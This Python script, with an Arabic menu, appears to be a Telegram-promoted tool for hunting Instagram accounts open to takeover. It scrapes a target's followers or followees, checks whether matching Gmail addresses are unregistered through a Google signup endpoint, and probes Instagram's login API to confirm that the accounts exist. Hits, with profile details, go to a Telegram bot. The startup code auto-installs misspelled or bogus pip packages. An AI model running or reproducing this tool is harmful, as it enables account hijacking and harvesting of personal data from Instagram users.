#--------------------[code-py-@K_7FABOT]---------------------------
import webbrowser
webbrowser.open('https://t.me/t4twi')
try:
	import os , requests , random , time ,sys , names
	import instaloader
	import mechanize,time
	import mechanize,datetime
	import json
	from user_agent import generate_user_agent
	from uuid import uuid4
	from time import sleep
	uid = uuid4()
except:
	os.system("pip install instaloader")	
	os.system("pip install requsets")
	os.system("pip install names")
	os.system("pip install datetime")
	os.system("pip install user_agent")
	os.system("pip install json")
	os.system("pip install os")
	os.system("pip install random")
	os.system("pip install sys")
	os.system("pip install mechanize")
	os.system("pip install uid")
	os.system("pip install datetime")
	os.system("pip install uuid")
	os.system("pip install uuid4")
	os.system("pip install sleep")
	os.system("clear")

E = '\033[1;31m'
G = '\033[1;35m'
Z = '\033[1;31m' #احمر
X = '\033[1;33m' #اصفر
Z1 = '\033[2;31m' #احمر ثاني
F = '\033[2;32m' #اخضر
A = '\033[2;34m'#ازرق
C = '\033[2;35m' #وردي
B = '\033[2;36m'#سمائي
Y = '\033[1;34m' #ازرق فاتح
M = '\x1b[1;37m'#ابیض
S = '\033[1;33m'
U = '\x1b[1;37m'#ابیض
BRed = '\x1b[1;31m'
BGreen = '\x1b[1;32m'
BYellow = '\x1b[1;33m'
BBlue = '\x1b[1;34m'
BPurple = '\x1b[1;35m'
BCyan = '\x1b[1;36m'
BWhite = '\x1b[1;37m'

now = datetime.datetime.today()

os.system('clear')
def zaid0():
	print(f'{F}-{Z}-{Z1}-{S}-{E}-{B}-{B}-{S}-{F}-{Z}-{S}-{F}-{Z}-{Z1}-{S}-{E}-{B}-{B}-{S}-{F}-{Z}-{S}-{F}-{Z}-{Z1}-{S}-{E}-{B}-{B}-{S}-{F}-{Z}-{S}- ')
	print('')
	print(f'{F} HIT From {Z} [ {S}Gmail {Z}] ')
	print('')
	print(f'{F}-{Z}-{Z1}-{S}-{E}-{B}-{B}-{S}-{F}-{Z}-{S}-{F}-{Z}-{Z1}-{S}-{E}-{B}-{B}-{S}-{F}-{Z}-{S}-{F}-{Z}-{Z1}-{S}-{E}-{B}-{B}-{S}-{F}-{Z}-{S}- ')
	print('')
	print(f'{F} HIT ACCOUNT {Z}[{S} insta √ {Z}]  ')
	print('')
	print(f'{F}-{Z}-{Z1}-{S}-{E}-{B}-{B}-{S}-{F}-{Z}-{S}-{F}-{Z}-{Z1}-{S}-{E}-{B}-{B}-{S}-{F}-{Z}-{S}-{F}-{Z}-{Z1}-{S}-{E}-{B}-{B}-{S}-{F}-{Z}-{S}- ')
	print('')
	print(Z+
	'╔━━━━━━━━━━━━━━━━━━━━━━━━')
	
	print(f'{Z}┃{S} PY Tols {B} √ {F}@PS_5Y ')
	print(f'{Z}┃{S} PY Tols {B} √ {F}@t4twi')
	print(f'{Z}┃{S} my Tols {B} √ {F}ALSAYED')
	print(Z+
	'╚━━━━━━━━━━━━━━━━━━━━━━━━ ')
	print(f'{Z}┃{F} check insta From Gmail ')
	print(Z+
	'━━━━━━━━━━━━━━━━━━━━━━━━━ ')
zaid0()

M1=0
K1=0
Sj=0
sm=0

def check(email,user,token,ID,head):
 user=str(user).split('@')[0]
 email=str(email)
 url='https://i.instagram.com/api/v1/accounts/login/'
 headers = {'User-Agent':'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',  'Accept':'*/*',
                 'Cookie':'missing',
                 'Accept-Encoding':'gzip, deflate',
                 'Accept-Language':'en-US',
                 'X-IG-Capabilities':'3brTvw==',
                 'X-IG-Connection-Type':'WIFI',
                 'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8',
              'Host':'i.instagram.com'}
 data = {'uuid':uid,  'password':'@whisper666',
              'username':email,
              'device_id':uid,
              'from_reg':'false',
              '_csrftoken':'missing',
              'login_attempt_countn':'0'}
 req= requests.post(url, headers=headers, data=data).json()
 if req['message'] == 'The password you entered is incorrect. Please try again.':
	 rr=requests.get(f'https://www.instagram.com/{user}/?__a=1&__d=dis',headers=head).json()  
	 nam = str(rr['graphql']['user']['full_name'])
	 iddd = str(rr['graphql']['user']['id'])
	 fol = str(rr['graphql']['user']['edge_followed_by']['count'])
	 fols =str(rr['graphql']['user']['edge_follow']['count'])
	 isp = str(rr['graphql']['user']['is_private'])
	 bio = str(rr['graphql']['user']['edge_owner_to_timeline_media']['count'])
	 re = requests.get(f"https://o7aa.pythonanywhere.com/?id={iddd}")   
	 ree = re.json()
	 dat = ree['data']
	 tlg =(f"""
𖤍 تعال السيد جابلك متاح انستا 🟢  𖤍
---------------------------------------------------• ➤
[🔱] 𝐍𝐀𝐌𝐄 » {nam}
[🔱] 𝐔𝐒𝐄𝐑𝐍𝐀𝐌 » @{user}
[🔱] 𝐄𝐌𝐀𝐈𝐋 » {email}
[🔱] 𝐅𝐎𝐋𝐋𝐎𝐖𝐆 » {fol}
[🔱] 𝐅𝐎𝐋𝐋𝐎𝐖𝐒 » {fols}
[🔱] 𝐃𝐀𝐓𝐄 » {dat}
[🔱] 𝐏𝐎𝐒𝐓𝐒 » {bio}
[🔱] 𝐋𝐈𝐍𝐊 » https://www.instagram.com/{user}
---------------------------------------------------• ➤
[🔱] TeleGram ==> @t4twi""")
	 print(F+tlg)
	 print(f'{E}====================================')
	 requests.get("https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(tlg))
 if req['message'] == "The username you entered doesn't appear to belong to an account. Please check your username and try again.":
	 print(f"{S}Bad Insta {B}:{S} {email} ")

def zaid3():
 print(Z1+
	'━━━━━━━━━━━━━━━━━━━━━━━━━━')
 token = input(f'{Z}[{X}✥ {Z}] {B}ENTER TOKEN{B}     : '+Z)
 ID = int(input(f'{Z}[{X}✥ {Z}] {B}ENTER ID {B}       : '+Z))
 sid = input(f'{Z}[{X}✥ {Z}]{B} ENTER Season {B}   : '+F)
 head={'Cookie':'mid=YF55GAALAAF55lDR3NkHNG4S-vjw; ig_did=F3A1F3B5-01DB-457B-A6FA-6F83AD1717DE; ig_nrcb=1; shbid=13126; shbts=1616804137.1316793; rur=PRN; ig_direct_region_hint=ATN; csrftoken=ot7HDQ6ZX2EPbVQe1P9Nqvm1WmMkzKn2; ds_user_id=46165248972; sessionid='+sid}
 print(Z1+
	'━━━━━━━━━━━━━━━━━━━━━━━━━━')
 fil="user.txt"
 file=open(fil,"r").read().splitlines()
 for email in file:
 	eml=str(email)
 	email=eml+'@gmail.com'
 	url = 'https://android.clients.google.com/setup/checkavail'
 	h = {
		'Content-Length':'98',
		'Content-Type':'text/plain; charset=UTF-8',
		'Host':'android.clients.google.com',
		'Connection':'Keep-Alive',
		'user-agent':'GoogleLoginService/1.3(m0 JSS15J)',
		}
 	d = json.dumps({
		'username':email,
		'version':'3',
		'firstName':'AbaLahb',
		'lastName':'AbuJahl'
	})
 	res = requests.post(url,data=d,headers=h)
 	if res.json()['status'] == 'SUCCESS':
 	   print(f"{F}God Gmail {B}:{F} {email} ")
 	   email=email
 	   user=email.split('@gmail.com')[0]
 	   check(email,user,token,ID,head)
 	if res.json()['status'] =='USERNAME_UNAVAILABLE':
 	   print(f"{Z}Bad Gmail {B}:{Z} {email} ")

def followers():
	print(Z1+'━━━━━━━━━━━━━━━━━━━━━━━━━━━')
	os.system('rm -rf user.txt')
	L = instaloader.Instaloader()
	username=input(Z+"("+B+"● "+E+") "+B+" اكتب يوزر الحساب الوهمي "+A+" : "+B)
	print(Z1+'━━━━━━━━━━━━━━━━━━━━━━━━━━━')
	password=input(Z+"("+B+"● "+E+") "+B+" اكتب باسورد الحساب الوهمي "+A+" : "+B)
	print(Z1+'━━━━━━━━━━━━━━━━━━━━━━━━━━━')
	getuser=input(Z+"("+B+"● "+E+") "+B+" اكتب يوزر حساب سحب السته منه"+A+" : "+B)
	print(Z1+'━━━━━━━━━━━━━━━━━━━━━━━━━━━')
	print(F+"  يرجأ الانتضار قليلا من فضلك.....")
	print(Z1+'━━━━━━━━━━━━━━━━━━━━━━━━━━━')
	os.system('rm -rf done.txt')
	L.login(username,password)
	profile = instaloader.Profile.from_username(L.context, getuser)
	follow_list = []
	count=0
	ok=0
	for followee in profile.get_followers():
		name1=str(followee)
		name2=name1.split('Profile ')[1]
		name3=name2.split(' (')[0]
		follow_list.append(name3)
		file = open("user.txt","a")
		file.write(follow_list[count])
		file.write("\n")
		file.close()
		ok+=1
		print(F+"["+F+f" {ok} "+F+"] "+str(name3))
		count=count+1
	home()

def following():
	print(Z1+'━━━━━━━━━━━━━━━━━━━━━━━━━━━')
	os.system('rm -rf user.txt')
	L = instaloader.Instaloader()
	username=input(Z+"("+B+"● "+E+") "+B+" اكتب يوزر الحساب الوهمي "+A+" : "+B)
	print(Z1+'━━━━━━━━━━━━━━━━━━━━━━━━━━━')
	password=input(Z+"("+B+"● "+E+") "+B+" اكتب باسورد الحساب الوهمي "+A+" : "+B)
	print(Z1+'━━━━━━━━━━━━━━━━━━━━━━━━━━━')
	getuser=input(Z+"("+B+"● "+E+") "+B+" اكتب يوزر حساب سحب السته منه"+A+" : "+B)
	print(Z1+'━━━━━━━━━━━━━━━━━━━━━━━━━━━')
	print(F+"  يرجأ الانتضار قليلا من فضلك.....")
	print(Z1+'━━━━━━━━━━━━━━━━━━━━━━━━━━━')
	os.system('rm -rf done.txt')
	L.login(username,password)
	profile = instaloader.Profile.from_username(L.context, getuser)
	follow_list = []
	count=0
	ok=0
	for followee in profile.get_followees():
		name1=str(followee)
		name2=name1.split('Profile ')[1]
		name3=name2.split(' (')[0]
		follow_list.append(name3)
		file = open("user.txt","a")
		file.write(follow_list[count])
		file.write("\n")
		file.close()
		ok+=1
		print(F+"["+F+f" {ok} "+F+"] "+str(name3))
		count=count+1
	home()
	

def zaid4():
	try:
		file = 'user.txt'
		fuck = open(file, 'r')
		os.system(f'rm -rf {file}')
	except FileNotFoundError as error:
		home()


def home():
	print(Z1+
	'╔━━━━━━━━━━━━━━━━━━━━━━━━━')
	print(f'{Z1}┃{Z}{X}┃1┃ {Z}{B} لسته من اليتابعهم ')
	print(f'{Z}┃{S}━━━━━━━━━━━━━━━━━━━━━━━━ ')
	print(f'{Z1}┃{Z}{X}┃2┃ {Z}{B} لسته من متابعين ')
	print(f'{Z}┃{S}━━━━━━━━━━━━━━━━━━━━━━━━ ')
	print(f'{Z1}┃{Z}{X}┃3┃ {Z}{B} افحص السته الان ')
	print(f'{Z}┃{S}━━━━━━━━━━━━━━━━━━━━━━━━ ')		
	print(f'{Z1}┃{Z}{X}┃4┃ {Z}{F}-  🗑 حذف السته القديمه ')
	
	print(Z1+
	'╚━━━━━━━━━━━━━━━━━━━━━━━━━ ')
		
	tools = input((f'{Z} [{F}√{Z}] {B} اكتب الرقم المطلوب{B}  : '+F))
		
	if tools == '1':
		following()
	elif tools =='2':
		followers()
	elif tools =='3':
		zaid3()
	elif tools =='4':
		zaid4()
				
home()
 #الاداه مشفرا بحقوق قناة السيد
